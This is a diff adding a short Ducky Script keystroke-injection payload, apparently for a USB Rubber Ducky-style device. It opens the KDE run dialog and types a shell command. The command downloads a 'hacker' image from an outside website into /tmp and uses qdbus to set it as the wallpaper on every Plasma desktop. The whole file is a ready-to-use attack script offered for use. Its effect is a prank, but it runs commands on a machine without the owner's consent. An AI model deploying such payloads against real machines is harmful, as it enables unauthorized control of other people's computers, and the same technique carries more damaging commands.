@@ -1,0 +1,9 @@
+DELAY 1000
+
+ALT F2
+DELAY 500
+
+STRING sh -c "wget -qO /tmp/h.jpg https://c4.wallpaperflare.com/wallpaper/655/123/812/computer-danger-hacker-hacking-wallpaper-preview.jpg && qdbus org.kde.plasmashell /PlasmaShell org.kde.PlasmaShell.evaluateScript 'var d = desktops(); for(i=0;i<d.length;i++){d[i].wallpaperPlugin=\"org.kde.image\"; d[i].currentConfigGroup=Array(\"Wallpaper\",\"org.kde.image\",\"General\"); d[i].writeConfig(\"Image\",\"file:///tmp/h.jpg\");}'"
+
+DELAY 500
+ENTER
